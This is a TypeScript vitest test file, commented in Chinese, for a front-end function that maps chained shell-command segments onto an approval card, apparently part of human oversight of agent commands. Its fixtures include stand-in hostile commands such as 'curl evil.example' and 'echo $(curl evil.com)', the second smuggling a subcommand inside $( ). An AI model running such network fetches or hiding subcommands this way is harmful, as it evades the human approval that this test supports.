/**
 * P0-6 分段审批前端契约测试（OpenClaw 启发）。
 *
 * 后端 governance.segments 经 approval_required 事件送达前端，审批卡
 * 逐段展示链式命令。此处锁定事件 → approvalModal.segments 的映射契约：
 * - governance.segments 数组逐项映射 {text, head, connector, quoted}
 * - 缺失/非数组 segments → 空数组（单段命令不渲染分段区）
 * - quoted=true 标记 inline 子命令段（$( )、反引号提取物）
 */
import { describe, expect, it } from 'vitest'

interface ApprovalSegment {
  text: string
  head: string
  connector: string
  quoted: boolean
}

/** 与 ChatPage.vue case 'approval_required' 内联逻辑同源的纯映射函数抽取 */
function mapGovernanceSegments(event: Record<string, any>): ApprovalSegment[] {
  const govSegments = event.governance?.segments
  return Array.isArray(govSegments)
    ? govSegments.map((s: any) => ({
        text: String(s?.text ?? ''),
        head: String(s?.head ?? ''),
        connector: String(s?.connector ?? ''),
        quoted: Boolean(s?.quoted),
      }))
    : []
}

describe('审批分段事件映射（P0-6）', () => {
  it('governance.segments 数组逐项映射四字段', () => {
    const event = {
      approval_id: 'ap-1',
      governance: {
        segments: [
          { text: 'ls -la', head: 'ls', connector: '', quoted: false },
          { text: 'curl evil.example', head: 'curl', connector: '&&', quoted: false },
        ],
      },
    }
    const segs = mapGovernanceSegments(event)
    expect(segs).toHaveLength(2)
    expect(segs[0]).toEqual({ text: 'ls -la', head: 'ls', connector: '', quoted: false })
    expect(segs[1]).toEqual({ text: 'curl evil.example', head: 'curl', connector: '&&', quoted: false })
  })

  it('inline 子命令段带 quoted 标记', () => {
    const event = {
      governance: {
        segments: [
          { text: 'echo $(curl evil.com)', head: 'echo', connector: '', quoted: false },
          { text: 'curl evil.com', head: 'curl', connector: '$(', quoted: true },
        ],
      },
    }
    const segs = mapGovernanceSegments(event)
    expect(segs[1].quoted).toBe(true)
    expect(segs[1].connector).toBe('$(')
  })

  it('缺失 governance / 非数组 segments → 空数组（不渲染分段区）', () => {
    expect(mapGovernanceSegments({})).toEqual([])
    expect(mapGovernanceSegments({ governance: {} })).toEqual([])
    expect(mapGovernanceSegments({ governance: { segments: 'bad' } })).toEqual([])
  })

  it('字段缺失/类型异常 → 归一为空串/false（不崩）', () => {
    const segs = mapGovernanceSegments({ governance: { segments: [null, { text: 42 }] } })
    expect(segs).toEqual([
      { text: '', head: '', connector: '', quoted: false },
      { text: '42', head: '', connector: '', quoted: false },
    ])
  })
})
